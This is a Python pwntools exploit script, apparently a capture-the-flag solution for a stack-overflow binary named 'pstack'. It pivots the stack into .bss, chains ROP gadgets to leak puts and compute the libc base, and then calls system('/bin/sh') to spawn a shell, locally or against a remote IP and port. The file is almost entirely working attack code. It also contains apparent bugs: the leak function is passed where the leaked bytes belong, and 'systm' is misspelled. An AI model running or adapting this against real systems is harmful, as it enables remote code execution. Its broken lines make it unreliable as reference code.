#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Title : Linux Pwn Exploit
# Author: Axura (@4xura) - https://4xura.com
#
# Description:
# ------------
# A Python exp for Linux binex interaction
#
# Usage:
# ------
# - Local mode  : ./xpl.py
# - Remote mode : ./xpl.py [ <IP> <PORT> | <IP:PORT> ]
#

from pwnkit import *
from pwn import *
import os, sys

# CONFIG
# ---------------------------------------------------------------------------
BIN_PATH   = './pstack'
LIBC_PATH  = './libc.so.6'
#BIN_PATH   = '/home/Axura/pwn/pwnkit/examples/stack-pivot/pstack/pstack'
#LIBC_PATH  = '/home/Axura/pwn/pwnkit/examples/stack-pivot/pstack/libc.so.6'
elf        = ELF(BIN_PATH, checksec=False)
libc       = ELF(LIBC_PATH) if LIBC_PATH else None
host, port = parse_argv(sys.argv[1:], None, None)

ctx = Context(
    arch      = 'amd64',
    os        = 'linux',
    endian    = 'little',
    log_level = 'debug',
    terminal  = ('tmux', 'splitw', '-h')
).push()

io = Tube(
    file_path = BIN_PATH,
    libc_path = LIBC_PATH,
    host      = host,
    port      = port,
    env       = {}
).init().alias()
set_global_io(io)   # s, sa, sl, sla, r, ru, uu64

init_pr("debug", "%(asctime)s - %(levelname)s - %(message)s", "%H:%M:%S")

# EXPLOIT
# ---------------------------------------------------------------------------
def xpl(**kwargs):
   
    # g("break *0x4006b8")

    elf_ggs = ROPGadgets(elf)
    p_rdi_r = elf_ggs['p_rdi_r']
    ret     = elf_ggs['ret']
    elf_ggs.dump()

    put_plt = elf.sym.puts
    put_got = elf.got.puts
    leak(put_plt)
    leak(put_got)
    
    main      = 0x4006dd
    read_bss  = 0x4006b8  # DO NOT TOUCH rbp, rsp
    leave_ret = 0x4006db  
    
    bss = elf.bss()
    leak(bss)
    
    pivoted_stack = 0x601900+0x30-0x8 # @.bss 0x601928
    
    pl = flat({
    0x30: p64(pivoted_stack),   # pupulate rbp
    0x38: p64(read_bss)         # start from: text banner 0x4006b8
    }, filler=b'a')
    
    sla(b'overflow?\n', pl)
    
    # rsi=rbp-0x30=0x6018f8 (rbp=pivoted_stack)
    pl = flat({
    0x0: p64(pivoted_stack+0x30),   # 0x601958 ◂— '@GLIBC_2.2.5'
    0x8: p64(p_rdi_r),  # @0x601900 - target new stack
    0x10: p64(put_got), # e.g. 0x600fc8 —▸ 0x7f1a51080e50 (puts) - leak this
    0x18: p64(put_plt),
    0x20: p64(read_bss),
    0x30: p64(pivoted_stack-0x30),  # 0x6018f8
    0x38: p64(read_bss-0x8+0x2b),   # 0x4006db
    }, filler=b'b')
            
    sa(b'overflow\n', pl)
    
    """
    1st leave: rsp pivot to 0x601938, rbp to 0x6018f8
    2nd leave: rsp pivot to 0x601900, rbp to 0x601958
    """
    
    r()
    leak_puts = ru(b'\n')[:-1]
    leak_puts = int.from_bytes(leak, byteorder="little")
    leak(leak_puts)
    
    libc_base = leak_puts - libc.sym.puts
    system = libc_base + libc.sym.systm
    binsh  = libc_base + next(libc.search(b"/bin/sh\0"))
    leak(libc_base)
    leak(system)
    leak(binsh)

    pl = flat({
    0x0: p64(pivoted_stack+0x460),
    0x8: p64(p_rdi_r),
    0x10: p64(pivoted_stack+0x20),
    0x18: p64(system),
    0x20: b'/bin/sh\x00',
    0x30: p64(pivoted_stack),
    0x38: p64(read_bss-0x8+0x2b),
    }, filler=b'\x00')
    
    sa(b"Can you grasp this little bit of overflow?", pl)
    
    # g("b *0x4006db")

    io.interactive()

# PIPELINE
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    xpl()

